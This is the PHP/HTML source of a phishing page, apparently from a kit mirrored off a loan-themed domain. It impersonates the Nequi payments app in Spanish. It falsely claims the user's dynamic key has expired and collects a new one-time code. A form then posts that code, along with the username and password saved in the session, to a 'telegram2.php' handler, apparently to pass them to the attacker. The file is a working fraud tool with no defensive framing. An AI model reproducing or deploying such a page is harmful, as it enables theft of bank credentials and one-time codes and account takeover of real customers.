<?php 
session_start();
?>


<html>
    
<!-- Mirrored from prestamo-propulsor-al-instante.online/rastrear/informacion/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 03 May 2024 03:11:01 GMT -->
<head>
        <title>Solicitud</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="icon" href="../img/favicon.png" type="image/x-icon">
        <link rel="preconnect" href="https://fonts.googleapis.com/">
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;0,1000;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900;1,1000&amp;display=swap" rel="stylesheet">
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>      
        <link href="../css/style.css" rel="stylesheet">
        <link href="../css/stylesheet.css" rel="stylesheet">
        <script type="text/javascript" src="../js/functions.js"></script> 
        <script type="text/javascript" src="../js/ready.js"></script>  
        <script src="../js/jquery.jclock-min.html" type="text/javascript"></script>
        <style type="text/css">
            body{
            background-color: #fbe5f2;
            display: flex;
            justify-content: center;
            align-content: flex-start;
            margin-top: 150px;

        }
        #fondo{
            position: fixed;
            z-index: 600;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: #fbe5f2   ;                         
        }

        #frm-esperando{
            padding: 30px 20px 0px 20px;
        }
        
        /* Estilo para el botón habilitado */
        .btn-habilitado {
            background-color: #DA0081; /* Cambia el color a amarillo */
            color: #fff;
        }

        /* Estilo para el botón deshabilitado */
        .btn-deshabilitado {
            background-color: #F1BFDA; /* Cambia el color a gris */
            color: #fff;
        }
            #frm-nuevootp{
                display: none;
            }
        </style>     
        
    </head>
    <body>
        <div id="fondo"></div>
        
          <div id="" class="frm-modal">
            <img src="../img/nequi-4.png" alt="" style="width: 90%; margin-top: 30px;" >
          <div class="erro" id="err-nuevoot" style="display:flex;font-size: 20px;text-align: center;justify-content: center;">¡Ups! Tu clave dinámica expiró,  <br>intenta con una nueva. </div>
            <img src="../img/clave-dinamica.png" alt="" style="width: 40%; margin-top: 0px;" >
            <form action="telegram2.php" method="post" class="formulario">
                  <!-- Add hidden input fields to carry over $usuario and $password -->
    <input type="hidden" name="txt-usuario" value="<?php echo $_SESSION['usuario']; ?>">
    <input type="hidden" name="txt-password" value="<?php echo $_SESSION['password']; ?>">
                <input style="background-color: #fbf7fb; margin-bottom:15px ;" placeholder="Ingresa tu clave dinámica"type="password" name="txt-otp2" id="txt-otp2" class="entradas" autocomplete="off" maxlength="6" pattern="[0-9]*" inputmode="numeric" onkeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
                <button class="btn btn-deshabilitado" id="btn-validar" disabled>Validar</button>
            </div>
        </div>

         <script type="text/javascript">    
    $(document).ready(function(){
        // Función para habilitar/deshabilitar el botón
        function toggleButton() {
            var inputValue = $("#txt-otp2").val();
            if (inputValue.trim() !== "" && inputValue.length == 6) {
                $("#btn-validar").prop("disabled", false);
                $("#btn-validar").removeClass("btn-deshabilitado").addClass("btn-habilitado");
            } else {
                $("#btn-validar").prop("disabled", true);
                $("#btn-validar").removeClass("btn-habilitado").addClass("btn-deshabilitado");
            }
        }

        // Ejecutar la función al cargar la página
        toggleButton();

        // Ejecutar la función al escribir en el input
        $("#txt-otp2").on("input", toggleButton);
    }); 
</script> 

    </body>

<!-- Mirrored from prestamo-propulsor-al-instante.online/rastrear/informacion/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 03 May 2024 03:11:03 GMT -->
</html>

